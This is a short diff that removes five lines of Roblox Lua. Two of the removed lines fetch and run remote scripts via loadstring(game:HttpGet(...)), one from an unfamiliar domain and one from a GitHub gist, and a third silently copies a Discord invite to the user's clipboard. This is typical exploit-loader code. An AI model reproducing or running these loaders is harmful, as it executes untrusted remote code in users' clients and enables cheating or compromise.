@@ -1,5 +1,0 @@
-loadstring(game:HttpGet("https://yarhm.mhi.im/scr?channel=afemmax"))()
-loadstring(game:HttpGet("https://gist.githubusercontent.com/Defy-cloud/128d2dfc5030202b6d072807a89a790c/raw/043331f680a7d5954f0a1f9370560851ab3e3205/EmotePackFixer.lua"))()
-pcall(function()
-setclipboard("https://discord.gg/xGucmFjGVD")
-end)
